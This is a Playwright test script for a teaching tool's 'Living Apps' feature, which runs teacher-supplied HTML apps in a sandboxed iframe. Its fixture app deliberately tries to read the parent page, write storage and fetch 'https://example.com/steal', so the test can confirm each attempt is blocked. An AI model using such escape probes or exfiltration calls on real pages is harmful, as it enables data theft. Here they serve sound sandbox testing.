/* =====================================================================
   🪄 LIVING APPS — the real page, in a real browser
   ---------------------------------------------------------------------
   tools/living-apps-tests.mjs pins the arithmetic and the wiring. What no
   reading of the source can say is whether 🪄 Living app really reads an
   HTML file, previews it in its sandbox and puts a painted cover on the
   page; whether 🪄 Bring alive really opens the stage, sweeps the wand,
   wakes the app and — through the bridge — really picks up the app's own
   wand and taps its picture; whether the sandbox really holds; and whether
   a student's tap, practice and Escape behave.

     node tools/living-apps-check.mjs
     PW=/path/to/playwright/index.mjs node tools/living-apps-check.mjs
     LA_SAMPLE=/path/to/a/real/app.html node tools/living-apps-check.mjs   # also drive a real app
     LA_SCREENSHOTS=/some/dir node tools/living-apps-check.mjs             # keep screenshots
   ===================================================================== */
import { pathToFileURL } from 'node:url';
import path from 'node:path';
import fs from 'node:fs';
import os from 'node:os';

const PW = process.env.PW || '/opt/node22/lib/node_modules/playwright/index.mjs';
let chromium;
try { ({ chromium } = await import(PW)); }
catch (e) {
  console.log('living-apps-check: no Playwright at ' + PW + ' — skipped.');
  process.exit(0);
}

const ROOT = path.resolve(path.dirname(new URL(import.meta.url).pathname), '..');
const FILE = pathToFileURL(path.join(ROOT, 'index.html')).href;
const SHOTS = process.env.LA_SCREENSHOTS || process.env.SHOTS || '';
if (SHOTS) fs.mkdirSync(SHOTS, { recursive: true });
let pass = 0, fail = 0;
const ok = (name, cond, note) => {
  if (cond) { pass++; console.log('  ✓ ' + name); }
  else { fail++; console.log('  ✗ ' + name + (note ? '\n      ' + note : '')); }
};

/* A small living diagram built the way the ballast-tank app is: a wand
   button you pick up, then a picture you tap with it. Every tap with the
   wand in hand steps the picture on. It also tries to break out. */
const FIXTURE = `<!doctype html><html><head><meta charset="utf-8"><title>Floating and Sinking Lab</title>
<style>body{font:16px sans-serif;margin:16px}.figure-stage{width:320px;height:160px;background:#dfefff;border-radius:12px}
body.wand-held .figure-stage{outline:3px solid gold}</style></head><body>
<article class="question-paper"><h2>Why does the submarine sink?</h2>
<div class="figure-stage" id="stage"><span id="step">0</span></div>
<button class="btn btn-wand" id="wand" aria-pressed="false">Pick up the magic wand</button>
<p id="escape">?</p></article>
<script>
var held=false, step=0;
document.getElementById('wand').addEventListener('click',function(){held=!held;this.setAttribute('aria-pressed',held?'true':'false');document.body.classList.toggle('wand-held',held);});
document.getElementById('stage').addEventListener('click',function(){ if(!held) return; step++; document.getElementById('step').textContent=String(step); document.body.setAttribute('data-step',String(step)); });
var tries=[];
try{ tries.push('parent:' + (parent.document ? 'READ' : 'none')); }catch(e){ tries.push('parent:blocked'); }
try{ localStorage.setItem('x','1'); tries.push('storage:WROTE'); }catch(e){ tries.push('storage:blocked'); }
try{ fetch('https://example.com/steal').then(function(){tries.push('fetch:SENT');document.getElementById('escape').textContent=tries.join(' ');},function(){tries.push('fetch:blocked');document.getElementById('escape').textContent=tries.join(' ');}); }catch(e){ tries.push('fetch:blocked'); }
document.getElementById('escape').textContent=tries.join(' ');
</script></body></html>`;
const TMP = fs.mkdtempSync(path.join(os.tmpdir(), 'living-apps-'));
const FIXTURE_FILE = path.join(TMP, 'Floating_and_Sinking_Lab.html');
fs.writeFileSync(FIXTURE_FILE, FIXTURE);

const browser = await chromium.launch();
const ctx = await browser.newContext({ viewport: { width: 1180, height: 900 } });
const page = await ctx.newPage();
const shot = async (name) => { if (SHOTS) await page.screenshot({ path: path.join(SHOTS, 'living-apps-' + name + '.png') }); };

await page.route(/firebase-[a-z]+-compat\.js(?:\?.*)?$/, route => route.fulfill({ contentType: 'text/javascript', body: '' }));
// Nothing an app does may reach the network; any request that is not the
// page's own files is counted here.
const outbound = [];
await page.route('https://example.com/**', route => { outbound.push(route.request().url()); route.abort(); });
await page.addInitScript(() => {
  const chain = () => new Proxy(function () { return chain(); }, {
    get: (t, k) => (k === 'then' ? undefined : chain()),
    apply: () => chain(), construct: () => chain(), set: () => true
  });
  window.pdfjsLib = chain(); window.firebase = chain(); window.grecaptcha = chain();
});
const errors = [];
page.on('pageerror', e => errors.push(e.message));
await page.goto(FILE);
await page.waitForTimeout(1200);
ok('the page loads with no uncaught error', errors.length === 0, errors.join('\n      '));
ok('the living apps module is loaded and wired', await page.evaluate(() => !!(window.LivingApps && lapp)));

await page.evaluate(() => {
  const W = 600, H = 780;
  const el = (tag, attrs) => {
    const n = document.createElementNS('http://www.w3.org/2000/svg', tag);
    Object.keys(attrs || {}).forEach(k => n.setAttribute(k, attrs[k]));
    return n;
  };
  const wrap = document.createElement('div');
  wrap.className = 'pageWrap';
  wrap.style.cssText = 'position:relative;flex:none;width:' + W + 'px;height:' + H + 'px;min-width:' + W + 'px;min-height:' + H + 'px;background:#fff';
  const canvas = document.createElement('canvas');
  canvas.width = W; canvas.height = H;
  const svg = el('svg', { viewBox: '0 0 ' + W + ' ' + H, preserveAspectRatio: 'none' });
  svg.classList.add('overlay');
  svg.style.cssText = 'position:absolute;inset:0;width:100%;height:100%';
  wrap.appendChild(canvas); wrap.appendChild(svg);
  document.body.appendChild(wrap);
  const p = { num: 1, baseW: W, baseH: H, wrap, canvas, svg, viewport1: { convertToPdfPoint: (x, y) => [x, H - y] } };
  pages = [p]; pdfDoc = {}; scale = 1; annotations = [];
  attachOverlayHandlers(p);
  currentUser = { uid: 'teacher-1', email: ADMIN_EMAIL, displayName: 'Teacher' };
  applyRoleUI();
  setTool('select');
});

console.log('\n📎 The adder');
ok('the teacher has the 🪄 Living app button', await page.evaluate(() => getComputedStyle($('livingAppBtn')).display !== 'none'));
await page.evaluate(() => $('livingAppBtn').click());
await page.waitForSelector('.laAdder', { timeout: 3000 }).catch(() => {});
ok('it opens the adder', !!(await page.$('.laAdder')));
ok('…with ➕ Put on the page waiting for an app', await page.evaluate(() => document.querySelector('.laAdder [data-la="add"]').disabled));
await page.fill('.laAdder .laPaste', 'just some words');
await page.waitForTimeout(100);
ok('plain words are refused in words, not added', await page.evaluate(() =>
  /does not look like an HTML app/.test(document.querySelector('.laInfo').textContent) && document.querySelector('.laAdder [data-la="add"]').disabled));
await page.fill('.laAdder .laPaste', '');
await page.setInputFiles('.laAdder input[type=file]', FIXTURE_FILE);
await page.waitForFunction(() => !document.querySelector('.laAdder [data-la="add"]').disabled, null, { timeout: 3000 }).catch(() => {});
const picked = await page.evaluate(() => ({
  title: document.querySelector('.laAdder .laTitle').value,
  info: document.querySelector('.laInfo').textContent,
  enabled: !document.querySelector('.laAdder [data-la="add"]').disabled
}));
ok('an HTML file is read, titled from its <title>', picked.title === 'Floating and Sinking Lab', JSON.stringify(picked));
ok('…and recognised as having a magic wand', /magic wand/.test(picked.info) && picked.enabled, picked.info);
await page.waitForSelector('.laPreview iframe.laFrame', { timeout: 3000 }).catch(() => {});
const prevFrame = await page.evaluate(() => {
  const f = document.querySelector('.laPreview iframe.laFrame');
  return f ? { sandbox: f.getAttribute('sandbox'), csp: /Content-Security-Policy/.test(f.srcdoc) } : null;
});
ok('the preview runs it in a scripts-only sandbox with its CSP', prevFrame && prevFrame.sandbox === 'allow-scripts' && prevFrame.csp, JSON.stringify(prevFrame));
await shot('adder');
await page.click('.laAdder [data-la="add"]');
await page.waitForFunction(() => annotations.some(annLivingApp), null, { timeout: 6000 }).catch(() => {});
await page.waitForTimeout(200);
const added = await page.evaluate(() => {
  const a = annotations.find(annLivingApp);
  const g = a && pages[0].svg.querySelector('g[data-id="' + a.id + '"]');
  const box = g && g.querySelector('.pastePic');
  return a ? {
    kind: a.kind, src: a.src.slice(0, 23), srcLen: a.src.length, ratio: a.ratio, w: a.w, h: a.h,
    inside: a.x >= 0 && a.y >= 0 && a.x + a.w <= 600 && a.y + a.h <= 780,
    title: a.lapp.title, html: a.lapp.html.length, data: box && box.getAttribute('data-lapp'),
    chrome: g.querySelectorAll('.aiNoteHead, .aiNoteBtn, button').length,
    adder: !!document.querySelector('.laAdder'), dirty, undo: undoStack.length
  } : null;
});
ok('➕ puts it on the page as a frameless picture carrying the app', added && added.kind === 'paste' && added.data === '1' && added.chrome === 0 && added.html > 500, JSON.stringify(added));
ok('…its cover is a painted picture in its own shape, on the paper',
  added && added.src === 'data:image/jpeg;base64,' && added.srcLen > 5000 && Math.abs(added.w / added.h - added.ratio) < 0.02 && added.inside, JSON.stringify(added));
ok('…the adder closes, one undo step and a save to come', added && !added.adder && added.dirty === true && added.undo >= 1);

console.log('\n🪄 Bring alive');
const bar = await page.evaluate(() => {
  const a = annotations.find(annLivingApp);
  selectedId = a.id; editModeId = a.id;
  renderAllOverlays();
  return {
    bar: (pages[0].wrap.querySelector('.aiBar') || {}).innerText || '',
    badge: (pages[0].wrap.querySelector('.editBadge') || {}).textContent || ''
  };
});
ok('selected, its bar offers 🪄 Bring alive, ✎ Change app, Lock and Remove', /Bring alive/.test(bar.bar) && /Change app/.test(bar.bar) && /Lock/.test(bar.bar) && /Remove/.test(bar.bar), bar.bar);
ok('…and the badge names it a living app', /Living app/.test(bar.badge), bar.badge);
await shot('selected');
await page.evaluate(() => {
  const b = Array.from(pages[0].wrap.querySelectorAll('.aiBar button')).find(x => /Bring alive/.test(x.textContent));
  b.dispatchEvent(new PointerEvent('pointerdown', { bubbles: true, cancelable: true }));
});
await page.waitForSelector('.laStage', { timeout: 3000 }).catch(() => {});
const during = await page.evaluate(() => ({
  stage: !!document.querySelector('.laStage'),
  hidden: !!document.querySelector('.laStage iframe.laFrame.laHidden'),
  wand: !!document.querySelector('.laStage .laFlyWand'),
  title: (document.querySelector('.laStage h2') || {}).textContent || ''
}));
ok('the stage opens with the app’s title', during.stage && during.title === 'Floating and Sinking Lab', JSON.stringify(during));
ok('…the wand sweeps in while the app is still asleep', during.hidden && during.wand, JSON.stringify(during));
await shot('spell');
const frameOf = () => page.frames().find(f => f !== page.mainFrame() && f.parentFrame() === page.mainFrame() && /about:srcdoc/.test(f.url()) );
await page.waitForFunction(() => {
  const f = document.querySelector('.laStage iframe.laFrame');
  return f && !f.classList.contains('laHidden');
}, null, { timeout: 4000 }).catch(() => {});
let stepped = '';
for (let i = 0; i < 40 && stepped !== '1'; i++) {
  await page.waitForTimeout(100);
  const fr = frameOf();
  if (fr) stepped = await fr.evaluate(() => document.body.getAttribute('data-step') || '').catch(() => '');
}
ok('…and the wand touches the picture as it wakes: the app picked up its wand and stepped on', stepped === '1', 'step=' + stepped);
const hint1 = await page.evaluate(() => (document.querySelector('.laStage .laHint') || {}).textContent || '');
ok('…and the stage says what happened', /wand touched the picture/.test(hint1), hint1);
await shot('alive');
await page.click('.laStage [data-la="cast"]');
let step2 = '';
for (let i = 0; i < 20 && step2 !== '2'; i++) {
  await page.waitForTimeout(100);
  step2 = await frameOf().evaluate(() => document.body.getAttribute('data-step') || '').catch(() => '');
}
ok('🪄 Wave the wand again steps it on — the wand is not put down', step2 === '2', 'step=' + step2);
await page.keyboard.press('w');
let step3 = '';
for (let i = 0; i < 20 && step3 !== '3'; i++) {
  await page.waitForTimeout(100);
  step3 = await frameOf().evaluate(() => document.body.getAttribute('data-step') || '').catch(() => '');
}
ok('…and so does W on the keyboard', step3 === '3', 'step=' + step3);

const escape = await frameOf().evaluate(() => document.getElementById('escape').textContent).catch(e => 'ERR ' + e.message);
ok('the sandbox holds: no parent page, no storage', /parent:blocked/.test(escape) && /storage:blocked/.test(escape), escape);
ok('…and nothing reached the network', outbound.length === 0 && !/fetch:SENT/.test(escape), outbound.join(' ') + ' ' + escape);
ok('…and nothing leaked into the page', await page.evaluate(() => !document.body.classList.contains('wand-held')));

await page.click('.laStage [data-la="restart"]');
await page.waitForTimeout(500);
const restarted = await frameOf().evaluate(() => document.getElementById('step').textContent).catch(() => '');
ok('↺ Start again reloads the app from the beginning', restarted === '0', restarted);
await page.keyboard.press('Escape');
await page.waitForTimeout(200);
ok('Escape closes the stage, and the app’s frame goes with it', await page.evaluate(() => !document.querySelector('.laStageBack') && !document.querySelector('iframe.laFrame')));

console.log('\n✎ Change app');
await page.evaluate(() => { const a = annotations.find(annLivingApp); lappEdit(a.id); });
await page.waitForSelector('.laAdder', { timeout: 3000 }).catch(() => {});
await page.fill('.laAdder .laTitle', 'Sinking lab, part 2');
await page.click('.laAdder [data-la="add"]');
await page.waitForFunction(() => annotations.find(annLivingApp).lapp.title === 'Sinking lab, part 2', null, { timeout: 5000 }).catch(() => {});
const edited = await page.evaluate(() => ({ n: annotations.filter(annLivingApp).length, title: annotations.find(annLivingApp).lapp.title }));
ok('✎ Change app renames it in place — still one app on the page', edited.n === 1 && edited.title === 'Sinking lab, part 2', JSON.stringify(edited));

console.log('\n👩‍🎓 A student taps it alive');
const student = await page.evaluate(async () => {
  currentUser = { uid: 'kid-1', email: 'kid@example.com', displayName: 'Kid' };
  applyRoleUI();
  setTool('select');
  renderAllOverlays();
  const a = annotations.find(annLivingApp);
  const img = pages[0].svg.querySelector('g[data-id="' + a.id + '"] .pastePic img');
  const r = img.getBoundingClientRect();
  img.dispatchEvent(new PointerEvent('pointerdown', { bubbles: true, cancelable: true, pointerId: 7, pointerType: 'mouse',
    button: 0, buttons: 1, isPrimary: true, clientX: r.left + r.width / 2, clientY: r.top + r.height / 2 }));
  await new Promise(r2 => setTimeout(r2, 80));
  const opened = !!document.querySelector('.laStage');
  lapp.close();
  const adder = lapp.openAdder();
  return { hidden: getComputedStyle($('livingAppBtn')).display === 'none', opened, adder, adderShown: !!document.querySelector('.laAdder') };
});
ok('the student has no 🪄 Living app button', student.hidden, JSON.stringify(student));
ok('…a tap on the picture brings it alive', student.opened);
ok('…and the adder refuses a student even when called directly', !student.adder && !student.adderShown);

console.log('\n📝 Practice keeps it');
const practice = await page.evaluate(() => {
  currentUser = { uid: 'teacher-1', email: ADMIN_EMAIL, displayName: 'Teacher' };
  applyRoleUI();
  annotations.push({ id: 'ink1', page: 1, type: 'pen', color: '#000', width: 2, points: [{ x: 10, y: 10 }, { x: 40, y: 40 }] });
  const before = annotations.length;
  startPractice();
  const during = annotations.map(a => ({ app: annLivingApp(a), locked: !!a.locked }));
  const realLocked = teacherAnswers.filter(annLivingApp).some(a => a.locked);
  endPractice();
  return { before, during, after: annotations.length, realLocked };
});
ok('practising keeps the living app on the page, locked, and hides the answers', practice.during.length === 1 && practice.during[0].app && practice.during[0].locked, JSON.stringify(practice));
ok('…the teacher’s own is untouched, and ending practice puts everything back', !practice.realLocked && practice.after === practice.before);

if (process.env.LA_SAMPLE && fs.existsSync(process.env.LA_SAMPLE)) {
  console.log('\n🌊 A real app: ' + path.basename(process.env.LA_SAMPLE));
  await page.evaluate(() => { annotations = []; renderAllOverlays(); $('livingAppBtn').click(); });
  await page.setInputFiles('.laAdder input[type=file]', process.env.LA_SAMPLE);
  await page.waitForFunction(() => !document.querySelector('.laAdder [data-la="add"]').disabled, null, { timeout: 5000 }).catch(() => {});
  await page.click('.laAdder [data-la="add"]');
  await page.waitForFunction(() => annotations.some(annLivingApp), null, { timeout: 6000 }).catch(() => {});
  await page.evaluate(() => lappOpen(annotations.find(annLivingApp).id));
  await page.waitForTimeout(3500);
  const real = await frameOf().evaluate(() => ({
    held: document.body.classList.contains('wand-held'),
    playing: !!document.querySelector('.is-playing, [data-playing="true"], .is-wand-target'),
    pressed: Array.from(document.querySelectorAll('.btn-wand')).some(b => b.getAttribute('aria-pressed') === 'true')
  })).catch(e => ({ err: e.message }));
  const hint = await page.evaluate(() => (document.querySelector('.laStage .laHint') || {}).textContent || '');
  ok('the real app’s own wand was picked up by the stage’s wand', real.pressed || real.held, JSON.stringify(real) + ' ' + hint);
  await shot('real-app');
  await page.keyboard.press('Escape');
}

ok('no uncaught error anywhere along the way', errors.length === 0, errors.join('\n      '));
await browser.close();
fs.rmSync(TMP, { recursive: true, force: true });
console.log('\n' + pass + ' passed, ' + fail + ' failed');
process.exit(fail ? 1 : 0);
